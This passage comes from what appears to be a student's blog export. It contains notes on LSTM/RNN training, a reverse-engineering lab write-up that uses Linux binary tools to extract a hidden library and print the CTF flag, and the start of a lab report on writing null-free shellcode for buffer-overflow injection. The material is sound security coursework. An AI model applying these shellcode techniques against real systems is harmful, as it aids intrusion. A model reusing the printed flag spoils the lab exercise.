<li>接下来看input Gate，$x_2$代表input能不能进入memory，当$x_2$值为0时，也就是bias-10占主导，这时候我们根据sigmoid函数的性质函数值基本为0，也就是屏蔽了input输入，如果这里$x_2$为1，因为权重100很大，所以这里可以计算为90，也就是input可以进入memory</li>
<li>接下来看Forget Gate，$x_2$为100是，bias是10，计算出的函数值约为1，也就是memory不会忘记，如果是-1那么就是0，就是清空memory</li>
<li>接下来看Output Gate，$x_3$代表记忆的值能否出output，当$x_3=0$时，因为$x_3$的权重是100，bias=-10，那么函数值就约为0，就是不输出，当$x_3=1$，函数值约为1，就是输出，output打开</li>
</ul>
<p>这里注意memery的值是除非为0，是和当前值相加的，memory值控制上一轮</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119113155126.png" alt="image-20230119113155126"></p>
<p>这其实LSTM就是把普通神经元替换成了一个LSTM单元，只是它所需要的输入是之前神经元的4倍</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119114816985.png" alt="image-20230119114816985"></p>
<p>如上图，把LSTM排成一排，c这个vector就是这一整排LSTM的memeory cell的值，每个memory cell里面的值代表c的一个维度</p>
<ol>
<li>在时间点上输入一个$x^t$</li>
<li>分别乘上4个matrix，把$x^t$转换成四个vector，分别是$z^f$（操控forget gate），$z_i$操控input gate，Z(LSTM的input)，$z^o$(操控output gate)，其中z的第一维就是第一个LSTM的输入，第二位就是第二个LSTM的输入，$z^f,z^i,z^o$同理</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119115711705.png" alt="image-20230119115711705"></p>
<p>一个LSTM运算也可以描述为上面的样子</p>
<h3 id="4-训练"><a href="#4-训练" class="headerlink" title="4.训练"></a>4.训练</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119120204643.png" alt="image-20230119120204643"></p>
<p>首先，要想训练数据必须label的</p>
<p>在这里： </p>
<p>如果输入Taipei（Taipei是属于destination这个slot）。（这边输入的顺序和句子的顺序是一样的）<br>输入后，得到network的输出。这个输出是一个vector，这个vector的长度和slot的数目是一样的。如果network觉得Taipei是属于dest这个slot，则在dest这一维就会为1。得到output后，再和target算cross entropy 。这样就得到一个loss function。</p>
<p>接下来要更新参数，使loss最小化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119120518506.png" alt="image-20230119120518506"></p>
<p>这里还是使用 gradient descent来更新参数，之前为了让gradient descent更有效率的进行，有使用了<a href="https://so.csdn.net/so/search?q=反向传播&amp;spm=1001.2101.3001.7020">反向传播</a>（Backpropagation） 。</p>
<p>不过这里需要考虑一个句子的顺序，所以需要改用Backpropagation的进阶版，Backpropagation through time (BPTT)。</p>
<h5 id="RNN不好train"><a href="#RNN不好train" class="headerlink" title="RNN不好train"></a>RNN不好train</h5><p>可以从下图中看出，比较好的情况是训练过程中loss一直下降最终达到一个稳定，但是在RNN训练中可以看到loss曲线是很波动的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119121215472.png" alt="image-20230119121215472"></p>
<p>因为RNN的error surface是很崎岖的吗，平坦的范围很大，而且存在陡峭的悬崖，在平坦的surface上，由于gradient比较小，所以用比较大的learning rate。但是一旦突然遇到一个悬崖，此时gradient突然变大，而learning rate还没来得及变小，此时参数就会直接跑飞了。就像前面图的绿线，最后直接往上顶上去了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230119121523620.png" alt="image-20230119121523620"></p>
<p>那么为什么RNN的error surface这样的崎岖，可以看到，下面一排network是代表不同时间点使用的，不是指有这么多个network，这个network很简单</p>
<ul>
<li>只有一个神经元，这个神经元的output也会作为下一个神经元的input，加上 洗一个书简点的input，一起被输入到下一个时间点的神经元中</li>
<li>所有的weight都是1</li>
</ul>
<p>现在input是[1….0]除了第一个是1，其他都是0，那么时间点为1000的output就是$w^{999}$</p>
<p>在这整个过程中，神经元的那个weight被使用了999次。所以，w的变化有两种影响：</p>
<p>要么就是1变成1.01，造成gradient的巨大变化<br>要么就是0.99变成0，但是gradient约等于没变化<br>由于这里有两种变化情况，所以不能很死板地说，用大的learning rate或者小的learning rate就是好的。</p>
<p>所以RNN不好train的原因是：它有时间顺序，同样的weight在不同的时间点会被反复使用多次。</p>
<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>解决悬崖问题就是梯度爆炸，可以使用cliping的策略，也就是通过限制最大的步长从而限制爆炸的现象</p>
<p>使用LSTM可以解决gradient vanishing的问题：</p>
<ul>
<li><p>原始的RNN中，后一个时间点输入到memory cell的值会直接覆盖前一个时间点的memory cell的值，这相当于把前一个时间点的w对memory cell的 影响给消除掉了，所以容易产生梯度消失</p>
</li>
<li><p>而LSTM中，如果forget gate打开（即保留memory cell的值），memory cell值会是上一个时间点的memory cell的值加上现在 input的值。所以原来的 w 对 memory cell 造成的影响还保留着，没有被直接消除掉。所以训练的时候，可以给一个bias，使得forget gate在大多数时候都被开启。</p>
</li>
<li><p>另外，如果使用LSTM发生过拟合（由于LSTM有3个gate，参数比较多）。可以改用一个比LSTM简单的版本 ，Gated Recurrent Unit (GRU)，它只有2个gate（它把input gate和forget gate联动起来）：</p>
<p>当input gate被打开，forget gate就会被自动关闭（即清除原来memory cell的值）。</p>
</li>
</ul>
<p>RNN的变种的如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230121102658882.png" alt="image-20230121102658882"></p>
<p>之前RNN的使用是相同sequence的词语</p>
<p>RNN也可以做到，输入是vector sequence，而输出只有一个vector。如上图，是一个情感分析的例子。</p>
<p>输入一个句子到RNN中，最后输出这个句子包含的情感。 </p>
<p><img src="https://img-blog.csdnimg.cn/20200304144446315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FDTF9saWhhbg==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>输入是一个sequence（比较长），输出也是一个sequence（比较短）。以语音辨识为例子：</p>
<p>输入是一连串语音，每一小段时间的语音就是一个vector（图中的蓝色柱子）。<br>每一小段语音的vector通过RNN后会得到各自的意思，即“好好好棒棒棒棒棒”。<br>使用Trimming操作去除掉重复的东西，最后输出这段语音的意思，即“好棒”。<br>但是这样做还是有问题，如果经过Trimming操作会去除重复的东西，那如果实际结果是“好棒棒”的话，就会出错。要知道“好棒”和“好棒棒”(yygq)是完全相反的两种意思。</p>
<p>怎么办呢？用Connectionist Temporal Classification (CTC)。<br><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/20200304150005159.png" alt="img"></p>
<p>这个简单看一下过程，这个方法输出一个$\empty$代表null的意思，如上图，如果input一段语言，它的output是上图，拿掉$\empty$以后就是好棒</p>
<p><a href="https://www.zhihu.com/question/47642307/answer/106976649">(1 封私信 / 6 条消息) 谁给讲讲语音识别中的CTC方法的基本原理？ - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>Mechine Learning</category>
      </categories>
      <tags>
        <tag>Mechine Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Reserve2</title>
    <url>/2023/03/23/Reserve2/</url>
    <content><![CDATA[<h1 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a><center>逆向工程</center></h1><!--

**课程名称：<u>          汇编语言和逆向工程      </u>    成绩评定  ：<u>                                                      </u>**

**实验项目名称: <u>           </u>指导教师 ：<u>          刁文瑞               </u>**

**实验项目编号  ：<u>         实验1      </u>    实验项目类型  ：<u>                         </u>**

**实验地点 ：**<u>       淦昌苑 D226                   </u>

**学生姓名 ：<u>           李卓群              </u> 学号  ：<u>       202000460041     </u>**

**学院 ：<u>      网络空间安全学院                   </u>专业  ：<u>          网络空间安全              **</u>

**实验时间 ：**<u>             2023         </u> 年  <u>   3  </u> 月  <u>  09</u> 日

-->
<h2 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、 实验目的"></a>一、 实验目的</h2><p>​    本次实验的实验目的为使用Linux下的二进制分析工具对文件进行分析，提取隐藏在二进制文件中的flag。</p>
<h3 id="二、实验步骤和实验结果"><a href="#二、实验步骤和实验结果" class="headerlink" title="二、实验步骤和实验结果"></a>二、实验步骤和实验结果</h3><h3 id="2-1-Task-1：使用file解决类型问题"><a href="#2-1-Task-1：使用file解决类型问题" class="headerlink" title="2.1 Task 1：使用file解决类型问题"></a>2.1 Task 1：使用file解决类型问题</h3><p>​    首先使用file命令来查看文件的类型，file工具是通过搜索文件中的其它指示模式来判断文件类型的(eg. magic number),而不是通过扩展名来判断。可以看到payload文件是一个ASCII的文本文件，我们可以使用head命令查看文件中的前10行内容。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323083508195.png" alt="image-20230323083508195" style="zoom: 50%;" /></p>
<h5 id="Q：文件使用了什么编码方式？"><a href="#Q：文件使用了什么编码方式？" class="headerlink" title="Q：文件使用了什么编码方式？"></a><strong>Q：</strong>文件使用了什么编码方式？</h5><p>​    这里我们使用实验手册中给出的在线文本分析工具，可以看到分析文件采用的是base64的编码方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323084014023.png" alt="image-20230323084014023" style="zoom: 50%;" /></p>
<p>​    然后对文件内容进行解码，并将解码内容保存到新文件中，这里我们可以使用linux自带的base64解码指令来完成对payload的解码过程，使用file来查看解码后的文件类型，可以看到这是一个compressed的压缩文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323084421874.png" alt="image-20230323084421874" style="zoom: 50%;" /></p>
<p>​    使用file -z 选项可以查看压缩文件，可以看到压缩文件里面还有一个用tar进行压缩的压缩文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323084624524.png" alt="image-20230323084624524" style="zoom: 33%;" /></p>
<p>​    用tar解压缩对文件内同进行提取，可以得到：ctf和67b8601两个文件</p>
<h5 id="Q-这两个文件分别是什么类型？"><a href="#Q-这两个文件分别是什么类型？" class="headerlink" title="Q:这两个文件分别是什么类型？"></a>Q:这两个文件分别是什么类型？</h5><p>​    从下图中可以看出ctf文件是一个ELF的可执行文件，不过调试信息已经被分离了。67b8601是一个PC bitmap文件，也就是一个位图文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323085047641.png" alt="image-20230323085047641" style="zoom: 50%;" /></p>
<h3 id="2-2-Task-2：使用ldd探索依赖性"><a href="#2-2-Task-2：使用ldd探索依赖性" class="headerlink" title="2.2 Task 2：使用ldd探索依赖性"></a>2.2 Task 2：使用ldd探索依赖性</h3><p>​    直接运行ctf可以发现报错，会缺少某一个共享的链接库文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323085350574.png" alt="image-20230323085350574" style="zoom:50%;" /></p>
<p>​    Linux操作系统自带一个名为ldd的程序，可以使用该程序找到文件依赖哪些共享库，ldd可能会运行二进制文件来找到依赖关系(可能不安全)</p>
<h5 id="Q：这个文件存在哪些未解析的依赖项？"><a href="#Q：这个文件存在哪些未解析的依赖项？" class="headerlink" title="Q：这个文件存在哪些未解析的依赖项？"></a>Q：这个文件存在哪些未解析的依赖项？</h5><p>​    从ldd返回的结果可以看到，其中包括linux-vdso.so.1、lib5ae9b7f.so、libstdc++.sp.6、libgcc_s.so.6、libc.so.6、libm.so.6、/lib64/ld-linux-x86-64.so.2，其中其它依赖项都可以在系统中找到，只有lib5ae9b7f.so显示not found的状态</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323090006178.png" alt="image-20230323090006178" style="zoom: 50%;" /></p>
<p>​    从库名称可以看出，无法在任何标准存储库中找到它，它必须位于目前提供文件的某个位置，所有ELF二进制文件和库文件都以魔数开头，且header中包含ELF的字段，因此可以使用grep命令来搜索字符串’ELF’，但是直接使用grep命令得到的内容太多，这里我们使用管道进行过滤</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323091652227.png" alt="image-20230323091652227" style="zoom:67%;" /></p>
<p>​    可以看到“ELF”字符出现在了 67b8601 文件中，但这个并不是一个 ELF 文件，我们需要进一步分析。</p>
<h3 id="2-3-Task-3：使用-xxd-查看文件内容"><a href="#2-3-Task-3：使用-xxd-查看文件内容" class="headerlink" title="2.3  Task 3：使用 xxd 查看文件内容"></a>2.3  Task 3：使用 xxd 查看文件内容</h3><p>​    使用xdd来分析文件的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323092624499.png" alt="image-20230323092624499" style="zoom:50%;" /></p>
<h5 id="Q：xxd默认每行显示多少字节的内容"><a href="#Q：xxd默认每行显示多少字节的内容" class="headerlink" title="Q：xxd默认每行显示多少字节的内容"></a>Q：xxd默认每行显示多少字节的内容</h5><p>​    第一列输出的是十六进制格式显示的文件偏移，两行之间差0x10，也就是每一行显示16个字节的内容。</p>
<p>​    文件的 xxd 输出中，可以找到 ELF 魔数字节，我们可以合理猜测有一个 ELF 文件（即缺少的库文件） 被隐藏其中，ELF 魔数字节即为 ELF 文件的起始位置，但终止位置尚未确定。 接下来我们需要将这个 ELF 提取出来，并命名为缺少的库文件的名字。</p>
<h3 id="2-4-Task-4：使用readelf解析并提取ELF文件"><a href="#2-4-Task-4：使用readelf解析并提取ELF文件" class="headerlink" title="2.4 Task 4：使用readelf解析并提取ELF文件"></a>2.4 Task 4：使用readelf解析并提取ELF文件</h3><p>​    根据上一问的分析我们可以发现ELF字段出现在第35个字节的位置，，那么我们就要将第0x35个字节后面的内容进行提取。这里0x35转化为十进制是53，然后可以使用readelf查看temp_elf的头部信息(可能又尾部尾部无效信息)</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323093347647.png" alt="image-20230323093347647" style="zoom: 50%;" /></p>
<p>​    ELF二进制文件最后一部分是节头表，节头表偏移temp_elf中指定了，我们还知道了表中每个节头的大小（每一 项的大小），以及节头的数量。这意味着我们可以通过以下公式计算完整 ELF 库文件的大小： size = x + y × z </p>
<p>x = Start of section headers, y = Size of section headers, z = Number of section headers</p>
<p>x = 8568 y = 64 z = 27</p>
<p>size = 10296</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323094039208.png" alt="image-20230323094039208" style="zoom: 50%;" /></p>
<p>​    此时将当前目录加入环境变量，再执行ctf文件，可以看到ctf文件正常执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323094354119.png" alt="image-20230323094354119" style="zoom: 50%;" /></p>
<h5 id="Q：是否一定要去除隐藏的ELF-文件的尾部无效部分？不去除的情况下这个库文件是否还有效？"><a href="#Q：是否一定要去除隐藏的ELF-文件的尾部无效部分？不去除的情况下这个库文件是否还有效？" class="headerlink" title="Q：是否一定要去除隐藏的ELF 文件的尾部无效部分？不去除的情况下这个库文件是否还有效？"></a>Q：是否一定要去除隐藏的ELF 文件的尾部无效部分？不去除的情况下这个库文件是否还有效？</h5><p>​    不一定要去除ELF文件的尾部无效部分的，我们直接将temp_elf的内容复制到lib5ae9b7f.so中，发现仍然可以正确的链接执行，说明ELF文件可以被解析，库文件还是有效的</p>
<font color='red'>看到很多人直接使用head temp_elf > ??.so,这样是不对的，因为head命令默认情况下只是复制了前10行的内容</font>

<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323100140919.png" alt="image-20230323100140919" style="zoom: 50%;" /></p>
<h3 id="2-5-Task-5：使用nm解析符号"><a href="#2-5-Task-5：使用nm解析符号" class="headerlink" title="2.5 Task 5：使用nm解析符号"></a>2.5 Task 5：使用nm解析符号</h3><p>​    虽然 ctf 运行后没有报错，但似乎没有提示任何功能，$? 变量中包含的 ctf 退出状态为 1，表示有错 误。我们还需要进一步研究。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323100701335.png" alt="image-20230323100701335" style="zoom: 50%;" /></p>
<p>我们可以继续使用 readelf 查看库文件的符号表，C++ 允许函数重载，意味着可以存在多个具有相同名称的函数，只要它们有不同的签名即可。不幸 的是，对链接程序来说，它对 C++ 一无所知。如果有多个名称为 foo 的函数，链接器将不知道如何解析 对 foo 的引用，也不知道要使用哪个版本的 foo 。为了消除重复的名称，C++ 编译器提出了符号修饰 （mangled name）。符号修饰实质上是原始函数名称与函数参数编码的组合。这样，函数的每个版本都会获 得唯一的名称，并且链接器也不会对重载的函数产生歧义</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323100846257.png" alt="image-20230323100846257" style="zoom: 50%;" /></p>
<p>​    使用nm命令去解析静态符号表，发现是没有符号的，库文件应该也是被剥离了符号表的文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323101045839.png" alt="image-20230323101045689" style="zoom:67%;" /></p>
<p>​    使用-D能够看到一些符号，但是符号被修饰了，并不利用观察</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323101351783.png" alt="image-20230323101351783" style="zoom: 50%;" /></p>
<p>​    使用—demangle或者-C选项进行解析，可以变得易读</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323101515496.png" alt="image-20230323101515496" style="zoom:50%;" /></p>
<h5 id="Q：是哪个加密算法？包含了这个加密算法的什么功能？"><a href="#Q：是哪个加密算法？包含了这个加密算法的什么功能？" class="headerlink" title="Q：是哪个加密算法？包含了这个加密算法的什么功能？"></a>Q：是哪个加密算法？包含了这个加密算法的什么功能？</h5><p>​    RC4算法，包含了RC4算法的加密、解密、以及初始化的功能。根据输入的参数有rc4_state_t的结构体，也有密钥、字符串等作为参数输入。</p>
<h3 id="2-6-Task-6：使用strings查找Hints"><a href="#2-6-Task-6：使用strings查找Hints" class="headerlink" title="2.6 Task 6：使用strings查找Hints"></a>2.6 Task 6：使用strings查找Hints</h3><p>​    使用的是strings命令，来查看ctf的字符串信息，但是strings输出的字符串太多，我们可以使用grep命令来排查一些关键的字段</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323102258800.png" alt="image-20230323102258800" style="zoom:50%;" /></p>
<p>​    尝试添加相关字段为参数，感觉逻辑中又一种字符串检查机制在里面，但是都返回了执行错误</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323102602396.png" alt="image-20230323102602396" style="zoom: 50%;" /></p>
<h3 id="2-7-Task-7：使用-strace-和-ltrace-跟踪系统调用和库文件调用"><a href="#2-7-Task-7：使用-strace-和-ltrace-跟踪系统调用和库文件调用" class="headerlink" title="2.7 Task 7：使用 strace 和 ltrace 跟踪系统调用和库文件调用"></a>2.7 Task 7：使用 strace 和 ltrace 跟踪系统调用和库文件调用</h3><p>​        为了取得进展，我们通过查看 ctf 退出前的行为来调查 exit 显示错误代码的原因。这里有多种方法， 其中一种方法是使用名为 strace 和 ltrace 的两个工具。这两个工具分别显示二进制文件执行时的系统 调用和库文件调用。</p>
<p>​    可以看到大部分是库文件加载设置相关的，可以重点分析最后3个系统调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323103412504.png" alt="image-20230323103412504" style="zoom: 50%;" /></p>
<h5 id="Q：这-3-个系统调用分别是做什么的？"><a href="#Q：这-3-个系统调用分别是做什么的？" class="headerlink" title="Q：这 3 个系统调用分别是做什么的？"></a>Q：这 3 个系统调用分别是做什么的？</h5><p> 第一个系统调用是write，用来输出checking ‘show_me_the_flag’，应该是对输入参数的检查</p>
<p>第二个系统调用是write，用来输出ok</p>
<p>第三个系统调用是exit_group()就是退出进程中的所有线程，以状态1退出</p>
<p>​    查看 ctf 的系统调用行为没有太多帮助，所以我们将目光转向库文件调用。为了查看 ctf 执行的库文件 调用，我们要用到 ltrace ，ltrace的输出更具有可读性，因为并没有进程设置的相关代码，分析输出 结果，可以看到初始化了加密函数，该函数位于之前提取的库文件中；接着为一个 C++ 字符串赋值，大概 是用加密消息对其进行初始化；然后调用解密函数解密此消息，并将解密后的消息分配到新的 C++ 字符 串。 最后调用 getenv，该函数是用于查找环境变量的标准库函数。可以看到 ctf 需要一个名为 GUESSME 的环境变量，该名称很可能就是之前解密的字符串。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323103740918.png" alt="image-20230323103740918" style="zoom: 50%;" /></p>
<p>​    尝试将GUSSME环境变量设置为虚拟值，看ctf的行为是否发生变化，发现输出guess again也就是期望再猜一次</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323104041727.png" alt="image-20230323104041727" style="zoom:50%;" /></p>
<p>​    设置其它值，情况相同，从解密操作到“guess again”输出 到屏幕的那一瞬间，看不到有关 GUESSME 的任何提示，还需要继续分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323104519415.png" alt="image-20230323104519415" style="zoom:50%;" /></p>
<h3 id="2-8-Task-8：使用-objdump-检查指令级别的行为"><a href="#2-8-Task-8：使用-objdump-检查指令级别的行为" class="headerlink" title="2.8 Task 8：使用 objdump 检查指令级别的行为"></a>2.8 Task 8：使用 objdump 检查指令级别的行为</h3><p>​    使用objdump分析ctf的.rodata节，可以看到“guess again”</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323105515450.png" alt="image-20230323105515368" style="zoom:50%;" /></p>
<h5 id="Q：“guess-again”存放的地址位置是什么？"><a href="#Q：“guess-again”存放的地址位置是什么？" class="headerlink" title="Q：“guess again”存放的地址位置是什么？"></a>Q：“guess again”存放的地址位置是什么？</h5><p>​    这个问题首先看g字符在的那一行，起始地址是0x4011a0,然后g在最后一个字节，那也就是0x 4011af的位置。</p>
<p>​    下一步我们对ctf进行反汇编分析查看指令，使用Intel语法风格输出</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323110056683.png" alt="image-20230323110056683" style="zoom:50%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323110127978.png" alt="image-20230323110127978" style="zoom:50%;" /></p>
<p>​    指令在 0x400dcd 处加载 guess again 字符串，然后使用 puts 将其输出，这是一个失败分支，从这 里往回看，失败分支是起始地址为 0x400dc0 的循环的一个分支，在每次循环中，它会将数组（可能是字符串） 的字节加载到 edx 中，rbx 寄存器指向数组的基址（base），rax 对其进行索引（index）。如果载入的字节结果为 NULL ，那么地址 0x400dc6 的指令就会跳转到失败分支。这里与 NULL 进行比较其实是对字符串结 尾的检查，如果这里已经到达字符串的结尾，说明字符串太短，没办法进行匹配。这里test是与运算，根据结果设置标志位。dl是低8位</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323110838132.png" alt="image-20230323110838132" style="zoom:50%;" /></p>
<p>​    如果载入的字节结果不为 NULL ，那么 je 跳转到下一条指令，地址 0x400dc8 的指令将 edx 中的低字节与另一个字符串中的字节进行比较，该字符串以 rcx 为指向数组的基址（base）、rax 为索引（index）。如 果比较的两字节相匹配，那么程序将跳转到地址 0x400de0 。在这里对字符串索引 +1 ，并检查当前 rax 的 值（即字符串的长度）是否等于 0x15。如果相等，那么字符串比较完成，否则程序跳转到另一个迭代中。</p>
<p>​    那么通过分析就可以发现cmp操作是基于rcx寄存器进行的，因此重点分析rcx寄存器</p>
<h3 id="2-9-Task-9：使用-GDB-转存动态字符串缓冲区"><a href="#2-9-Task-9：使用-GDB-转存动态字符串缓冲区" class="headerlink" title="2.9 Task 9：使用 GDB 转存动态字符串缓冲区"></a>2.9 Task 9：使用 GDB 转存动态字符串缓冲区</h3><p>​    使用gdb动态分析，首先设置程序在cmp处断点，也就是比较位置0x400dc8，下面设置环境变量，设置输入参数，程序运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323112140055.png" alt="image-20230323112140055" style="zoom:50%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323112157439.png" alt="image-20230323112157439" style="zoom:50%;" /></p>
<p>打印寄存器rcx的值，发现和输入进行比较的内容，将内容作为参数输入，得到结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230323112607844.png" alt="image-20230323112607844"></p>
<p><strong>flag = 84b34c124b2ba5ca224af8e33b077e9e</strong></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse3</title>
    <url>/2023/04/06/Reverse3/</url>
    <content><![CDATA[<h1 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a><center>逆向工程</center></h1><!--

**课程名称：<u>          汇编语言和逆向工程      </u>    成绩评定  ：<u>                                                      </u>**

**实验项目名称: <u>           </u>指导教师 ：<u>          刁文瑞               </u>**

**实验项目编号  ：<u>         实验3      </u>    实验项目类型  ：<u>          Shellcode编写               </u>**

**实验地点 ：**<u>       淦昌苑 D226                   </u>

**学生姓名 ：<u>           李卓群              </u> 学号  ：<u>       202000460041     </u>**

**学院 ：<u>      网络空间安全学院                   </u>专业  ：<u>          网络空间安全              **</u>

**实验时间 ：**<u>             2023         </u> 年  <u>   4  </u> 月  <u>  09</u> 日

-->
<h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><p>​    本次实验是学习编写shellcode，也就是我们在缓冲区溢出攻击中需要的注入代码。本实验将涵盖下面的主题，在缓冲区溢出中我们需要shellcode。 </p>
<p>1.shellcode</p>
<p>2.汇编代码</p>
<p>3.反汇编</p>
<h2 id="2-实验过程和结果"><a href="#2-实验过程和结果" class="headerlink" title="2.实验过程和结果"></a>2.实验过程和结果</h2><h3 id="2-1-Task-1-编写shellcode"><a href="#2-1-Task-1-编写shellcode" class="headerlink" title="2.1 Task 1:编写shellcode"></a>2.1 Task 1:编写shellcode</h3><h4 id="2-1-1-Task-1-a：整个过程"><a href="#2-1-1-Task-1-a：整个过程" class="headerlink" title="2.1.1 Task 1.a：整个过程"></a>2.1.1 Task 1.a：整个过程</h4><p>​    首先将汇编代码进行编译，编译为目标文件的形式。可以看到使用nasm命令将汇编代码变成了目标文件mysh.o，使用file命令查看文件格式，发现该文件是一个elf32的可重定位文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406085733782.png" alt="image-20230406085733782" style="zoom: 50%;" /></p>
<p>​    下一边链接生成最终的二进制文件，可以看到使用ld命令后，文件最终变成了32位的可执行文件，然后使用echo命令打印运行程序前后的shell程序的id，说明我们的程序确实可以调用一个新的shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406090226455.png" alt="image-20230406090226455" style="zoom: 50%;" /></p>
<p>​    下一步是在shellcode中提取相应的部分，我们需要从可执行文件或者目标文件中获取机器码，首先使用objdump来进行预处理，可以看到代码段的机器指令已经被翻译成了机器码，下面我们只需要从相应的目标文件的二进制内容中提取相应的部分。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20230406091110804.png" alt="image-20230406091110804" style="zoom: 50%;" /></p>
<p>​    下一步我们直接使用已经预制好的shellcode代码进行攻击，我们将提取的内容放入python文件，可以看到最终输出的需要复制的二进制shellcode。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230406092130289.png" alt="image-20230406092130289" style="zoom:50%;" /></p>
<h4 id="2-1-2-Task-1-b：从代码中清零"><a href="#2-1-2-Task-1-b：从代码中清零" class="headerlink" title="2.1.2 Task 1.b：从代码中清零"></a>2.1.2 Task 1.b：从代码中清零</h4><p>​    shellcode在进行注入的时候的一个问题就是shellcode代码中不能含有0，否则strcpy复制函数将在复制过程中终止。</p>
<p><strong>1.采用”xor eax,eax”的原因</strong></p>
<p>​    如果直接采用”mov eax 0”的形式，那么最终机器码中一定会翻译出0，“xor eax eax”可以避免0的产生。</p>
<p><strong>2.存储0x00000099，能直接mov eax, 0x99。而应该先把eax置为0，再把一个字节的0x99赋值给al寄存器。</strong></p>
<p>​    这样也是避免0的产生，因为直接使用mov eax 0x99，由于寄存器是32位的，因此会补零进行对齐，这样其实给eax赋的值就是0x00000099，最终shellcode中也产生了0，因此可以只对al也就是最低8位进行一个赋值，这样就不用考虑shellcode中出现0，另外也不用担心高位的问题，因为eax已经被我们提前置0了。</p>
<p><strong>3.在使用mov ebx “xyz#”这个命令中，如果我们先将寄存器向左移位８位，最高有效字节就会被丢弃，然后我们将寄存器向右移位８位，此时最高有效字节用0x00进行填充，相当于”xyz\0”最后一个字节变成0。</strong></p>
<p>​    现在我们必须考虑一个问题，如果我们使用shellcode来执行/bin/bash,这个命令的长度为9字节，如果计算末尾的0那么就是10字节，通常，要将这个字符串push到堆栈，我们需要使其长度为4的整数倍，所以我们将字符串转换为/bin///bash，但是这个任务中我们不能添加/到字符串中。</p>
